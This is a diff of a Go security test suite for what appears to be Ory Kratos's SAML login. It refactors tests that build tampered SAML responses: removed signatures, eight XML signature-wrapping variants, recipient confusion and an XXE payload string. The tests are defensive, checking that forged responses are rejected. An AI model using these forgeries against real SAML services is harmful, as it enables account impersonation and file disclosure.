@@ -5,6 +5,7 @@ import (
 	"crypto/tls"
 	"crypto/x509"
 	"encoding/json"
+	"github.com/stretchr/testify/require"
 	"net/http/httptest"
 	"strings"
 	"testing"
@@ -19,12 +20,11 @@ import (
 )
 
 type authCodeContainer struct {
-	FlowID string          `json:"flow_id"`
-	State  string          `json:"state"`
-	Traits json.RawMessage `json:"traits"`
+	FlowID    string          `json:"flow_id"`
+	RequestID string          `json:"request_id"`
+	State     string          `json:"state"`
+	Traits    json.RawMessage `json:"traits"`
 }
-
-type ory_kratos_continuity struct{}
 
 func TestHappyPath(t *testing.T) {
 
@@ -39,17 +39,14 @@ func TestHappyPath(t *testing.T) {
 	doc := etree.NewDocument()
 	doc.SetRoot(responseEl)
 
-	// Get Reponse string
+	// Get Response string
 	responseStr, err := doc.WriteToString()
 	assert.NilError(t, err)
 
-	req := PrepareTestSAMLResponseHTTPRequest(t, testMiddleware, authnRequest, authnRequestID, responseStr)
+	req := PrepareTestSAMLResponseHTTPRequest(t, strategy, testMiddleware, authnRequest, authnRequestID, responseStr)
 
 	// Send the SAML Response to the SP ACS
 	resp := httptest.NewRecorder()
-
-	// Start the continuity
-	startContinuity(resp, req, strategy)
 
 	// We make sure that continuity is respected
 	ps := initRouterParams()
@@ -58,7 +55,7 @@ func TestHappyPath(t *testing.T) {
 	strategy.HandleCallback(resp, req, ps)
 
 	// This is the Happy Path, the HTTP response code should be 302 (Found status)
-	assert.Check(t, !strings.Contains(resp.HeaderMap["Location"][0], "error"))
+	assert.Check(t, !strings.Contains(resp.Header()["Location"][0], "error"))
 }
 
 func TestAddSAMLResponseAttribute(t *testing.T) {
@@ -77,17 +74,14 @@ func TestAddSAMLResponseAttribute(t *testing.T) {
 	doc := etree.NewDocument()
 	doc.SetRoot(responseEl)
 
-	// Get Reponse string
+	// Get Response string
 	responseStr, err := doc.WriteToString()
 	assert.NilError(t, err)
 
-	req := PrepareTestSAMLResponseHTTPRequest(t, testMiddleware, authnRequest, authnRequestID, responseStr)
+	req := PrepareTestSAMLResponseHTTPRequest(t, strategy, testMiddleware, authnRequest, authnRequestID, responseStr)
 
 	// Send the SAML Response to the SP ACS
 	resp := httptest.NewRecorder()
-
-	// Start the continuity
-	startContinuity(resp, req, strategy)
 
 	// We make sure that continuity is respected
 	ps := initRouterParams()
@@ -96,7 +90,7 @@ func TestAddSAMLResponseAttribute(t *testing.T) {
 	strategy.HandleCallback(resp, req, ps)
 
 	// This is the Happy Path, the HTTP response code should be 302 (Found status)
-	assert.Check(t, strings.Contains(resp.HeaderMap["Location"][0], "error"))
+	assert.Check(t, strings.Contains(resp.Header()["Location"][0], "error"))
 }
 
 func TestAddSAMLResponseElement(t *testing.T) {
@@ -115,17 +109,14 @@ func TestAddSAMLResponseElement(t *testing.T) {
 	doc := etree.NewDocument()
 	doc.SetRoot(responseEl)
 
-	// Get Reponse string
+	// Get Response string
 	responseStr, err := doc.WriteToString()
 	assert.NilError(t, err)
 
-	req := PrepareTestSAMLResponseHTTPRequest(t, testMiddleware, authnRequest, authnRequestID, responseStr)
+	req := PrepareTestSAMLResponseHTTPRequest(t, strategy, testMiddleware, authnRequest, authnRequestID, responseStr)
 
 	// Send the SAML Response to the SP ACS
 	resp := httptest.NewRecorder()
-
-	// Start the continuity
-	startContinuity(resp, req, strategy)
 
 	// We make sure that continuity is respected
 	ps := initRouterParams()
@@ -134,7 +125,7 @@ func TestAddSAMLResponseElement(t *testing.T) {
 	strategy.HandleCallback(resp, req, ps)
 
 	// This is the Happy Path, the HTTP response code should be 302 (Found status)
-	assert.Check(t, strings.Contains(resp.HeaderMap["Location"][0], "error"))
+	assert.Check(t, strings.Contains(resp.Header()["Location"][0], "error"))
 }
 
 func TestAddSAMLAssertionAttribute(t *testing.T) {
@@ -158,27 +149,24 @@ func TestAddSAMLAssertionAttribute(t *testing.T) {
 	// Add an attribute to the Response
 	decryptedAssertion.CreateAttr("newAttr", "randomValue")
 
-	// Replace the SAML crypted Assertion in the SAML Response by SAML decrypted Assertion
+	// Replace the SAML encrypted Assertion in the SAML Response by SAML decrypted Assertion
 	ReplaceResponseAssertion(t, responseEl, decryptedAssertion)
 
-	// Get Reponse string
+	// Get Response string
 	responseStr, err := doc.WriteToString()
 	assert.NilError(t, err)
 
-	req := PrepareTestSAMLResponseHTTPRequest(t, testMiddleware, authnRequest, authnRequestID, responseStr)
+	req := PrepareTestSAMLResponseHTTPRequest(t, strategy, testMiddleware, authnRequest, authnRequestID, responseStr)
 
 	// Send the SAML Response to the SP ACS
 	resp := httptest.NewRecorder()
-
-	// Start the continuity
-	startContinuity(resp, req, strategy)
 
 	// We make sure that continuity is respected
 	ps := initRouterParams()
 
 	strategy.HandleCallback(resp, req, ps)
 
-	assert.Check(t, strings.Contains(resp.HeaderMap["Location"][0], "error"))
+	assert.Check(t, strings.Contains(resp.Header()["Location"][0], "error"))
 }
 
 func TestAddSAMLAssertionElement(t *testing.T) {
@@ -202,20 +190,17 @@ func TestAddSAMLAssertionElement(t *testing.T) {
 	// Add an attribute to the Response
 	decryptedAssertion.CreateElement("newEl")
 
-	// Replace the SAML crypted Assertion in the SAML Response by SAML decrypted Assertion
+	// Replace the SAML encrypted Assertion in the SAML Response by SAML decrypted Assertion
 	ReplaceResponseAssertion(t, responseEl, decryptedAssertion)
 
-	// Get Reponse string
+	// Get Response string
 	responseStr, err := doc.WriteToString()
 	assert.NilError(t, err)
 
-	req := PrepareTestSAMLResponseHTTPRequest(t, testMiddleware, authnRequest, authnRequestID, responseStr)
+	req := PrepareTestSAMLResponseHTTPRequest(t, strategy, testMiddleware, authnRequest, authnRequestID, responseStr)
 
 	// Send the SAML Response to the SP ACS
 	resp := httptest.NewRecorder()
-
-	// Start the continuity
-	startContinuity(resp, req, strategy)
 
 	// We make sure that continuity is respected
 	ps := initRouterParams()
@@ -224,7 +209,7 @@ func TestAddSAMLAssertionElement(t *testing.T) {
 	strategy.HandleCallback(resp, req, ps)
 
 	// This is the Happy Path, the HTTP response code should be 302 (Found status)
-	assert.Check(t, strings.Contains(resp.HeaderMap["Location"][0], "error"))
+	assert.Check(t, strings.Contains(resp.Header()["Location"][0], "error"))
 }
 
 func TestRemoveSAMLResponseSignatureValue(t *testing.T) {
@@ -244,17 +229,14 @@ func TestRemoveSAMLResponseSignatureValue(t *testing.T) {
 	signatureValueEl := doc.FindElement("//Signature/SignatureValue")
 	signatureValueEl.Parent().RemoveChild(signatureValueEl)
 
-	// Get Reponse string
+	// Get Response string
 	responseStr, err := doc.WriteToString()
 	assert.NilError(t, err)
 
-	req := PrepareTestSAMLResponseHTTPRequest(t, testMiddleware, authnRequest, authnRequestID, responseStr)
+	req := PrepareTestSAMLResponseHTTPRequest(t, strategy, testMiddleware, authnRequest, authnRequestID, responseStr)
 
 	// Send the SAML Response to the SP ACS
 	resp := httptest.NewRecorder()
-
-	// Start the continuity
-	startContinuity(resp, req, strategy)
 
 	// We make sure that continuity is respected
 	ps := initRouterParams()
@@ -263,7 +245,7 @@ func TestRemoveSAMLResponseSignatureValue(t *testing.T) {
 	strategy.HandleCallback(resp, req, ps)
 
 	// This is the Happy Path, the HTTP response code should be 302 (Found status)
-	assert.Check(t, strings.Contains(resp.HeaderMap["Location"][0], "error"))
+	assert.Check(t, strings.Contains(resp.Header()["Location"][0], "error"))
 }
 
 func TestRemoveSAMLResponseSignature(t *testing.T) {
@@ -283,17 +265,14 @@ func TestRemoveSAMLResponseSignature(t *testing.T) {
 	signatureEl := doc.FindElement("//Signature")
 	signatureEl.Parent().RemoveChild(signatureEl)
 
-	// Get Reponse string
+	// Get Response string
 	responseStr, err := doc.WriteToString()
 	assert.NilError(t, err)
 
-	req := PrepareTestSAMLResponseHTTPRequest(t, testMiddleware, authnRequest, authnRequestID, responseStr)
+	req := PrepareTestSAMLResponseHTTPRequest(t, strategy, testMiddleware, authnRequest, authnRequestID, responseStr)
 
 	// Send the SAML Response to the SP ACS
 	resp := httptest.NewRecorder()
-
-	// Start the continuity
-	startContinuity(resp, req, strategy)
 
 	// We make sure that continuity is respected
 	ps := initRouterParams()
@@ -302,7 +281,7 @@ func TestRemoveSAMLResponseSignature(t *testing.T) {
 	strategy.HandleCallback(resp, req, ps)
 
 	// This is the Happy Path, the HTTP response code should be 302 (Found status)
-	assert.Check(t, !strings.Contains(resp.HeaderMap["Location"][0], "error"))
+	assert.Check(t, !strings.Contains(resp.Header()["Location"][0], "error"))
 }
 
 func TestRemoveSAMLAssertionSignatureValue(t *testing.T) {
@@ -327,20 +306,17 @@ func TestRemoveSAMLAssertionSignatureValue(t *testing.T) {
 	signatureValueEl := decryptedAssertion.FindElement("//Signature/SignatureValue")
 	signatureValueEl.Parent().RemoveChild(signatureValueEl)
 
-	// Replace the SAML crypted Assertion in the SAML Response by SAML decrypted Assertion
+	// Replace the SAML encrypted Assertion in the SAML Response by SAML decrypted Assertion
 	ReplaceResponseAssertion(t, responseEl, decryptedAssertion)
 
-	// Get Reponse string
+	// Get Response string
 	responseStr, err := doc.WriteToString()
 	assert.NilError(t, err)
 
-	req := PrepareTestSAMLResponseHTTPRequest(t, testMiddleware, authnRequest, authnRequestID, responseStr)
+	req := PrepareTestSAMLResponseHTTPRequest(t, strategy, testMiddleware, authnRequest, authnRequestID, responseStr)
 
 	// Send the SAML Response to the SP ACS
 	resp := httptest.NewRecorder()
-
-	// Start the continuity
-	startContinuity(resp, req, strategy)
 
 	// We make sure that continuity is respected
 	ps := initRouterParams()
@@ -349,7 +325,7 @@ func TestRemoveSAMLAssertionSignatureValue(t *testing.T) {
 	strategy.HandleCallback(resp, req, ps)
 
 	// This is the Happy Path, the HTTP response code should be 302 (Found status)
-	assert.Check(t, strings.Contains(resp.HeaderMap["Location"][0], "error"))
+	assert.Check(t, strings.Contains(resp.Header()["Location"][0], "error"))
 }
 
 func TestRemoveSAMLAssertionSignature(t *testing.T) {
@@ -374,20 +350,17 @@ func TestRemoveSAMLAssertionSignature(t *testing.T) {
 	signatureEl := decryptedAssertion.FindElement("//Signature")
 	signatureEl.Parent().RemoveChild(signatureEl)
 
-	// Replace the SAML crypted Assertion in the SAML Response by SAML decrypted Assertion
+	// Replace the SAML encrypted Assertion in the SAML Response by SAML decrypted Assertion
 	ReplaceResponseAssertion(t, responseEl, decryptedAssertion)
 
-	// Get Reponse string
+	// Get Response string
 	responseStr, err := doc.WriteToString()
 	assert.NilError(t, err)
 
-	req := PrepareTestSAMLResponseHTTPRequest(t, testMiddleware, authnRequest, authnRequestID, responseStr)
+	req := PrepareTestSAMLResponseHTTPRequest(t, strategy, testMiddleware, authnRequest, authnRequestID, responseStr)
 
 	// Send the SAML Response to the SP ACS
 	resp := httptest.NewRecorder()
-
-	// Start the continuity
-	startContinuity(resp, req, strategy)
 
 	// We make sure that continuity is respected
 	ps := initRouterParams()
@@ -397,7 +370,7 @@ func TestRemoveSAMLAssertionSignature(t *testing.T) {
 
 	// The SAML Assertion signature has been removed but the SAML Response is still signed
 	// The SAML Response has been modified, the SAML Response signature is invalid, so there is an error
-	assert.Check(t, strings.Contains(resp.HeaderMap["Location"][0], "error"))
+	assert.Check(t, strings.Contains(resp.Header()["Location"][0], "error"))
 }
 
 func TestRemoveBothSAMLResponseSignatureAndSAMLAssertionSignatureValue(t *testing.T) {
@@ -422,20 +395,17 @@ func TestRemoveBothSAMLResponseSignatureAndSAMLAssertionSignatureValue(t *testin
 	assertionSignatureEl := decryptedAssertion.FindElement("//Signature")
 	assertionSignatureEl.Parent().RemoveChild(assertionSignatureEl)
 
-	// Replace the SAML crypted Assertion in the SAML Response by SAML decrypted Assertion
+	// Replace the SAML encrypted Assertion in the SAML Response by SAML decrypted Assertion
 	ReplaceResponseAssertion(t, responseEl, decryptedAssertion)
 
-	// Get Reponse string
+	// Get Response string
 	responseStr, err := doc.WriteToString()
 	assert.NilError(t, err)
 
-	req := PrepareTestSAMLResponseHTTPRequest(t, testMiddleware, authnRequest, authnRequestID, responseStr)
+	req := PrepareTestSAMLResponseHTTPRequest(t, strategy, testMiddleware, authnRequest, authnRequestID, responseStr)
 
 	// Send the SAML Response to the SP ACS
 	resp := httptest.NewRecorder()
-
-	// Start the continuity
-	startContinuity(resp, req, strategy)
 
 	// We make sure that continuity is respected
 	ps := initRouterParams()
@@ -443,7 +413,7 @@ func TestRemoveBothSAMLResponseSignatureAndSAMLAssertionSignatureValue(t *testin
 	// We send the request to Kratos
 	strategy.HandleCallback(resp, req, ps)
 
-	assert.Check(t, strings.Contains(resp.HeaderMap["Location"][0], "error"))
+	assert.Check(t, strings.Contains(resp.Header()["Location"][0], "error"))
 }
 
 func TestAddXMLCommentsInSAMLAttributes(t *testing.T) {
@@ -474,20 +444,17 @@ func TestAddXMLCommentsInSAMLAttributes(t *testing.T) {
 	// Get and Decrypt SAML Assertion
 	decryptedAssertion := GetAndDecryptAssertionEl(t, testMiddleware, doc)
 
-	// Replace the SAML crypted Assertion in the SAML Response by SAML decrypted Assertion
+	// Replace the SAML encrypted Assertion in the SAML Response by SAML decrypted Assertion
 	ReplaceResponseAssertion(t, responseEl, decryptedAssertion)
 
-	// Get Reponse string
+	// Get Response string
 	responseStr, err := doc.WriteToString()
 	assert.NilError(t, err)
 
-	req := PrepareTestSAMLResponseHTTPRequest(t, testMiddleware, authnRequest, authnRequestID, responseStr)
+	req := PrepareTestSAMLResponseHTTPRequest(t, strategy, testMiddleware, authnRequest, authnRequestID, responseStr)
 
 	// Send the SAML Response to the SP ACS
 	resp := httptest.NewRecorder()
-
-	// Start the continuity
-	startContinuity(resp, req, strategy)
 
 	// We make sure that continuity is respected
 	ps := initRouterParams()
@@ -499,7 +466,8 @@ func TestAddXMLCommentsInSAMLAttributes(t *testing.T) {
 	ids, _, err := strategy.D().PrivilegedIdentityPool().ListIdentities(context.Background(), identity.ListIdentityParameters{Expand: identity.ExpandEverything})
 	assert.NilError(t, err)
 	traitsMap := make(map[string]interface{})
-	json.Unmarshal(ids[0].Traits, &traitsMap)
+	err = json.Unmarshal(ids[0].Traits, &traitsMap)
+	require.NoError(t, err)
 	g := traitsMap["groups"]
 	assert.Assert(t, g != nil)
 
@@ -551,17 +519,14 @@ func TestXSW1ResponseWrap1(t *testing.T) {
 	evilResponseEl.RemoveAttr("ID")
 	evilResponseEl.CreateAttr("ID", "id-evil")
 
-	// Get Reponse string
+	// Get Response string
 	responseStr, err := evilResponseDoc.WriteToString()
 	assert.NilError(t, err)
 
-	req := PrepareTestSAMLResponseHTTPRequest(t, testMiddleware, authnRequest, authnRequestID, responseStr)
+	req := PrepareTestSAMLResponseHTTPRequest(t, strategy, testMiddleware, authnRequest, authnRequestID, responseStr)
 
 	// Send the SAML Response to the SP ACS
 	resp := httptest.NewRecorder()
-
-	// Start the continuity
-	startContinuity(resp, req, strategy)
 
 	// We make sure that continuity is respected
 	ps := initRouterParams()
@@ -569,7 +534,7 @@ func TestXSW1ResponseWrap1(t *testing.T) {
 	// We send the request to Kratos
 	strategy.HandleCallback(resp, req, ps)
 
-	assert.Check(t, strings.Contains(resp.HeaderMap["Location"][0], "error"))
+	assert.Check(t, strings.Contains(resp.Header()["Location"][0], "error"))
 }
 
 // Similar to XSW #1, XSW #2 manipulates SAML Responses.
@@ -596,7 +561,7 @@ func TestXSW2ResponseWrap2(t *testing.T) {
 	// Remove the whole Signature element of the copied Response Element
 	RemoveResponseSignature(originalResponseDoc)
 
-	// We put the orignal response and its signature on the same level, just under the evil reponse
+	// We put the original response and its signature on the same level, just under the evil Response
 	evilResponseDoc.FindElement("//Response").AddChild(originalResponseEl)
 	evilResponseDoc.FindElement("//Response").AddChild(evilResponseDoc.FindElement("//Signature"))
 
@@ -604,17 +569,14 @@ func TestXSW2ResponseWrap2(t *testing.T) {
 	evilResponseEl.RemoveAttr("ID")
 	evilResponseEl.CreateAttr("ID", "id-evil")
 
-	// Get Reponse string
+	// Get Response string
 	responseStr, err := evilResponseDoc.WriteToString()
 	assert.NilError(t, err)
 
-	req := PrepareTestSAMLResponseHTTPRequest(t, testMiddleware, authnRequest, authnRequestID, responseStr)
+	req := PrepareTestSAMLResponseHTTPRequest(t, strategy, testMiddleware, authnRequest, authnRequestID, responseStr)
 
 	// Send the SAML Response to the SP ACS
 	resp := httptest.NewRecorder()
-
-	// Start the continuity
-	startContinuity(resp, req, strategy)
 
 	// We make sure that continuity is respected
 	ps := initRouterParams()
@@ -622,7 +584,7 @@ func TestXSW2ResponseWrap2(t *testing.T) {
 	// We send the request to Kratos
 	strategy.HandleCallback(resp, req, ps)
 
-	assert.Check(t, strings.Contains(resp.HeaderMap["Location"][0], "error"))
+	assert.Check(t, strings.Contains(resp.Header()["Location"][0], "error"))
 }
 
 // XSW #3 is the first example of an XSW that wraps the Assertion element.
@@ -643,7 +605,7 @@ func TestXSW3AssertionWrap1(t *testing.T) {
 	// Get and Decrypt SAML Assertion
 	decryptedAssertion := GetAndDecryptAssertionEl(t, testMiddleware, evilResponseDoc)
 
-	// Replace the SAML crypted Assertion in the SAML Response by SAML decrypted Assertion
+	// Replace the SAML encrypted Assertion in the SAML Response by SAML decrypted Assertion
 	ReplaceResponseAssertion(t, evilResponseEl, decryptedAssertion)
 
 	// Copy the Response Element
@@ -664,17 +626,14 @@ func TestXSW3AssertionWrap1(t *testing.T) {
 	// Change one attribute
 	evilResponseDoc.FindElement("//Response/Assertion/AttributeStatement/Attribute/AttributeValue").SetText("evil_alice@example.com")
 
-	// Get Reponse string
+	// Get Response string
 	responseStr, err := evilResponseDoc.WriteToString()
 	assert.NilError(t, err)
 
-	req := PrepareTestSAMLResponseHTTPRequest(t, testMiddleware, authnRequest, authnRequestID, responseStr)
+	req := PrepareTestSAMLResponseHTTPRequest(t, strategy, testMiddleware, authnRequest, authnRequestID, responseStr)
 
 	// Send the SAML Response to the SP ACS
 	resp := httptest.NewRecorder()
-
-	// Start the continuity
-	startContinuity(resp, req, strategy)
 
 	// We make sure that continuity is respected
 	ps := initRouterParams()
@@ -687,7 +646,7 @@ func TestXSW3AssertionWrap1(t *testing.T) {
 	assert.NilError(t, err)
 
 	// We have to check that there is either an error or an identity created without the modified attribute
-	assert.Check(t, strings.Contains(resp.HeaderMap["Location"][0], "error") || strings.Contains(string(ids[0].Traits), "alice@example.com"))
+	assert.Check(t, strings.Contains(resp.Header()["Location"][0], "error") || strings.Contains(string(ids[0].Traits), "alice@example.com"))
 }
 
 // XSW #4 is similar to #3, except in this case the original Assertion becomes a child of the copied Assertion.
@@ -706,7 +665,7 @@ func TestXSW4AssertionWrap2(t *testing.T) {
 	// Get and Decrypt SAML Assertion
 	decryptedAssertion := GetAndDecryptAssertionEl(t, testMiddleware, evilResponseDoc)
 
-	// Replace the SAML crypted Assertion in the SAML Response by SAML decrypted Assertion
+	// Replace the SAML encrypted Assertion in the SAML Response by SAML decrypted Assertion
 	ReplaceResponseAssertion(t, evilResponseEl, decryptedAssertion)
 
 	// Copy the Response Element
@@ -727,17 +686,14 @@ func TestXSW4AssertionWrap2(t *testing.T) {
 	// Change the username
 	evilResponseDoc.FindElement("//Response/Assertion/AttributeStatement/Attribute/AttributeValue").SetText("evil_alice@example.com")
 
-	// Get Reponse string
+	// Get Response string
 	responseStr, err := evilResponseDoc.WriteToString()
 	assert.NilError(t, err)
 
-	req := PrepareTestSAMLResponseHTTPRequest(t, testMiddleware, authnRequest, authnRequestID, responseStr)
+	req := PrepareTestSAMLResponseHTTPRequest(t, strategy, testMiddleware, authnRequest, authnRequestID, responseStr)
 
 	// Send the SAML Response to the SP ACS
 	resp := httptest.NewRecorder()
-
-	// Start the continuity
-	startContinuity(resp, req, strategy)
 
 	// We make sure that continuity is respected
 	ps := initRouterParams()
@@ -750,7 +706,7 @@ func TestXSW4AssertionWrap2(t *testing.T) {
 	assert.NilError(t, err)
 
 	// We have to check that there is either an error or an identity created without the modified attribute
-	assert.Check(t, strings.Contains(resp.HeaderMap["Location"][0], "error") || strings.Contains(string(ids[0].Traits), "alice@example.com"))
+	assert.Check(t, strings.Contains(resp.Header()["Location"][0], "error") || strings.Contains(string(ids[0].Traits), "alice@example.com"))
 }
 
 // XSW #5 is the first instance of Assertion wrapping we see where the Signature and the original Assertion aren’t in one of the three standard configurations (enveloped/enveloping/detached).
@@ -770,7 +726,7 @@ func TestXSW5AssertionWrap3(t *testing.T) {
 	// Get and Decrypt SAML Assertion
 	decryptedAssertion := GetAndDecryptAssertionEl(t, testMiddleware, evilResponseDoc)
 
-	// Replace the SAML crypted Assertion in the SAML Response by SAML decrypted Assertion
+	// Replace the SAML encrypted Assertion in the SAML Response by SAML decrypted Assertion
 	ReplaceResponseAssertion(t, evilResponseEl, decryptedAssertion)
 
 	// Copy the Response Element
@@ -790,17 +746,14 @@ func TestXSW5AssertionWrap3(t *testing.T) {
 	// Change the username
 	evilResponseDoc.FindElement("//Response/Assertion/AttributeStatement/Attribute/AttributeValue").SetText("evil_alice@example.com")
 
-	// Get Reponse string
+	// Get Response string
 	responseStr, err := evilResponseDoc.WriteToString()
 	assert.NilError(t, err)
 
-	req := PrepareTestSAMLResponseHTTPRequest(t, testMiddleware, authnRequest, authnRequestID, responseStr)
+	req := PrepareTestSAMLResponseHTTPRequest(t, strategy, testMiddleware, authnRequest, authnRequestID, responseStr)
 
 	// Send the SAML Response to the SP ACS
 	resp := httptest.NewRecorder()
-
-	// Start the continuity
-	startContinuity(resp, req, strategy)
 
 	// We make sure that continuity is respected
 	ps := initRouterParams()
@@ -813,7 +766,7 @@ func TestXSW5AssertionWrap3(t *testing.T) {
 	assert.NilError(t, err)
 
 	// We have to check that there is either an error or an identity created without the modified attribute
-	assert.Check(t, strings.Contains(resp.HeaderMap["Location"][0], "error") || strings.Contains(string(ids[0].Traits), "alice@example.com"))
+	assert.Check(t, strings.Contains(resp.Header()["Location"][0], "error") || strings.Contains(string(ids[0].Traits), "alice@example.com"))
 }
 
 // XSW #6 inserts its copied Assertion into the same location as #’s 4 and 5.
@@ -833,7 +786,7 @@ func TestXSW6AssertionWrap4(t *testing.T) {
 	// Get and Decrypt SAML Assertion
 	decryptedAssertion := GetAndDecryptAssertionEl(t, testMiddleware, evilResponseDoc)
 
-	// Replace the SAML crypted Assertion in the SAML Response by SAML decrypted Assertion
+	// Replace the SAML encrypted Assertion in the SAML Response by SAML decrypted Assertion
 	ReplaceResponseAssertion(t, evilResponseEl, decryptedAssertion)
 
 	// Copy the Response Element
@@ -853,17 +806,14 @@ func TestXSW6AssertionWrap4(t *testing.T) {
 	// Change the username
 	evilResponseDoc.FindElement("//Response/Assertion/AttributeStatement/Attribute/AttributeValue").SetText("evil_alice@example.com")
 
-	// Get Reponse string
+	// Get Response string
 	responseStr, err := evilResponseDoc.WriteToString()
 	assert.NilError(t, err)
 
-	req := PrepareTestSAMLResponseHTTPRequest(t, testMiddleware, authnRequest, authnRequestID, responseStr)
+	req := PrepareTestSAMLResponseHTTPRequest(t, strategy, testMiddleware, authnRequest, authnRequestID, responseStr)
 
 	// Send the SAML Response to the SP ACS
 	resp := httptest.NewRecorder()
-
-	// Start the continuity
-	startContinuity(resp, req, strategy)
 
 	// We make sure that continuity is respected
 	ps := initRouterParams()
@@ -876,7 +826,7 @@ func TestXSW6AssertionWrap4(t *testing.T) {
 	assert.NilError(t, err)
 
 	// We have to check that there is either an error or an identity created without the modified attribute
-	assert.Check(t, strings.Contains(resp.HeaderMap["Location"][0], "error") || strings.Contains(string(ids[0].Traits), "alice@example.com"))
+	assert.Check(t, strings.Contains(resp.Header()["Location"][0], "error") || strings.Contains(string(ids[0].Traits), "alice@example.com"))
 }
 
 // XSW #7 inserts an Extensions element and adds the copied Assertion as a child. Extensions is a valid XML element with a less restrictive schema definition.
@@ -895,7 +845,7 @@ func TestXSW7AssertionWrap5(t *testing.T) {
 	// Get and Decrypt SAML Assertion
 	decryptedAssertion := GetAndDecryptAssertionEl(t, testMiddleware, evilResponseDoc)
 
-	// Replace the SAML crypted Assertion in the SAML Response by SAML decrypted Assertion
+	// Replace the SAML encrypted Assertion in the SAML Response by SAML decrypted Assertion
 	ReplaceResponseAssertion(t, evilResponseEl, decryptedAssertion)
 
 	// Copy the Response Element
@@ -916,17 +866,14 @@ func TestXSW7AssertionWrap5(t *testing.T) {
 	// Change the username
 	evilResponseDoc.FindElement("//Response/Extension/Assertion/AttributeStatement/Attribute/AttributeValue").SetText("evil_alice@example.com")
 
-	// Get Reponse string
+	// Get Response string
 	responseStr, err := evilResponseDoc.WriteToString()
 	assert.NilError(t, err)
 
-	req := PrepareTestSAMLResponseHTTPRequest(t, testMiddleware, authnRequest, authnRequestID, responseStr)
+	req := PrepareTestSAMLResponseHTTPRequest(t, strategy, testMiddleware, authnRequest, authnRequestID, responseStr)
 
 	// Send the SAML Response to the SP ACS
 	resp := httptest.NewRecorder()
-
-	// Start the continuity
-	startContinuity(resp, req, strategy)
 
 	// We make sure that continuity is respected
 	ps := initRouterParams()
@@ -939,7 +886,7 @@ func TestXSW7AssertionWrap5(t *testing.T) {
 	assert.NilError(t, err)
 
 	// We have to check that there is either an error or an identity created without the modified attribute
-	assert.Check(t, strings.Contains(resp.HeaderMap["Location"][0], "error") || strings.Contains(string(ids[0].Traits), "alice@example.com"))
+	assert.Check(t, strings.Contains(resp.Header()["Location"][0], "error") || strings.Contains(string(ids[0].Traits), "alice@example.com"))
 }
 
 // XSW #8 uses another less restrictive XML element to perform a variation of the attack pattern used in XSW #7.
@@ -959,7 +906,7 @@ func TestXSW8AssertionWrap6(t *testing.T) {
 	// Get and Decrypt SAML Assertion
 	decryptedAssertion := GetAndDecryptAssertionEl(t, testMiddleware, evilResponseDoc)
 
-	// Replace the SAML crypted Assertion in the SAML Response by SAML decrypted Assertion
+	// Replace the SAML encrypted Assertion in the SAML Response by SAML decrypted Assertion
 	ReplaceResponseAssertion(t, evilResponseEl, decryptedAssertion)
 
 	// Copy the Response Element
@@ -977,17 +924,14 @@ func TestXSW8AssertionWrap6(t *testing.T) {
 	// Change the username
 	evilResponseDoc.FindElement("//Response/Assertion/AttributeStatement/Attribute/AttributeValue").SetText("evil_alice@example.com")
 
-	// Get Reponse string
+	// Get Response string
 	responseStr, err := evilResponseDoc.WriteToString()
 	assert.NilError(t, err)
 
-	req := PrepareTestSAMLResponseHTTPRequest(t, testMiddleware, authnRequest, authnRequestID, responseStr)
+	req := PrepareTestSAMLResponseHTTPRequest(t, strategy, testMiddleware, authnRequest, authnRequestID, responseStr)
 
 	// Send the SAML Response to the SP ACS
 	resp := httptest.NewRecorder()
-
-	// Start the continuity
-	startContinuity(resp, req, strategy)
 
 	// We make sure that continuity is respected
 	ps := initRouterParams()
@@ -1000,7 +944,7 @@ func TestXSW8AssertionWrap6(t *testing.T) {
 	assert.NilError(t, err)
 
 	// We have to check that there is either an error or an identity created without the modified attribute
-	assert.Check(t, strings.Contains(resp.HeaderMap["Location"][0], "error") || strings.Contains(string(ids[0].Traits), "alice@example.com"))
+	assert.Check(t, strings.Contains(resp.Header()["Location"][0], "error") || strings.Contains(string(ids[0].Traits), "alice@example.com"))
 }
 
 // If the response was meant for a different Service Provider, the current Service Provider should notice it and reject the authentication
@@ -1019,17 +963,14 @@ func TestTokenRecipientConfusion(t *testing.T) {
 	doc := etree.NewDocument()
 	doc.SetRoot(responseEl)
 
-	// Get Reponse string
+	// Get Response string
 	responseStr, err := doc.WriteToString()
 	assert.NilError(t, err)
 
-	req := PrepareTestSAMLResponseHTTPRequest(t, testMiddleware, authnRequest, authnRequestID, responseStr)
+	req := PrepareTestSAMLResponseHTTPRequest(t, strategy, testMiddleware, authnRequest, authnRequestID, responseStr)
 
 	// Send the SAML Response to the SP ACS
 	resp := httptest.NewRecorder()
-
-	// Start the continuity
-	startContinuity(resp, req, strategy)
 
 	// We make sure that continuity is respected
 	ps := initRouterParams()
@@ -1037,7 +978,7 @@ func TestTokenRecipientConfusion(t *testing.T) {
 	// We send the request to Kratos
 	strategy.HandleCallback(resp, req, ps)
 
-	assert.Check(t, strings.Contains(resp.HeaderMap["Location"][0], "error"))
+	assert.Check(t, strings.Contains(resp.Header()["Location"][0], "error"))
 
 }
 
@@ -1056,17 +997,14 @@ func TestXMLExternalEntity(t *testing.T) {
 	// Payload XEE
 	xee := "<?xml version=\"1.0\" encoding=\"ISO-8859-1\"?><!DOCTYPE foo [<!ELEMENT foo ANY ><!ENTITY xxe SYSTEM  \"file:///dev/random\" >]><foo>&xxe;</foo>"
 
-	// Get Reponse string
+	// Get Response string
 	responseStr, err := doc.WriteToString()
 	assert.NilError(t, err)
 
-	req := PrepareTestSAMLResponseHTTPRequest(t, testMiddleware, authnRequest, authnRequestID, xee+responseStr)
+	req := PrepareTestSAMLResponseHTTPRequest(t, strategy, testMiddleware, authnRequest, authnRequestID, xee+responseStr)
 
 	// Send the SAML Response to the SP ACS
 	resp := httptest.NewRecorder()
-
-	// Start the continuity
-	startContinuity(resp, req, strategy)
 
 	// We make sure that continuity is respected
 	ps := initRouterParams()
@@ -1074,7 +1012,7 @@ func TestXMLExternalEntity(t *testing.T) {
 	// We send the request to Kratos
 	strategy.HandleCallback(resp, req, ps)
 
-	assert.Check(t, strings.Contains(resp.HeaderMap["Location"][0], "error"))
+	assert.Check(t, strings.Contains(resp.Header()["Location"][0], "error"))
 }
 
 func TestExtensibleStylesheetLanguageTransformation(t *testing.T) {
@@ -1090,23 +1028,21 @@ func TestExtensibleStylesheetLanguageTransformation(t *testing.T) {
 	doc.SetRoot(responseEl)
 
 	// Payload XSLT
